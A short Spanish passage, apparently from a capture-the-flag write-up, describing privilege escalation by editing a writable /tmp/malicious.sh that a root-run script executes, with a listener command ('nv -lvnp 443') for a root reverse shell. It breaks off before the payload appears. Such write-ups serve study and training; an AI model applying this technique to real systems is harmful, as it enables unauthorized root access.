...
vemos que este script ejecuta un archivo en ```/tmp/malicious.sh```, y nosotros tenemos acceso a editar ese archivo, por lo que podremos hacer una reverse shell con acceso a root escuchando en otra terminal en el cualquier puerto con ```nv -lvnp 443``` y copiando este script en ```/tmp/malicious.sh```
```
echo '#!/bin/bash
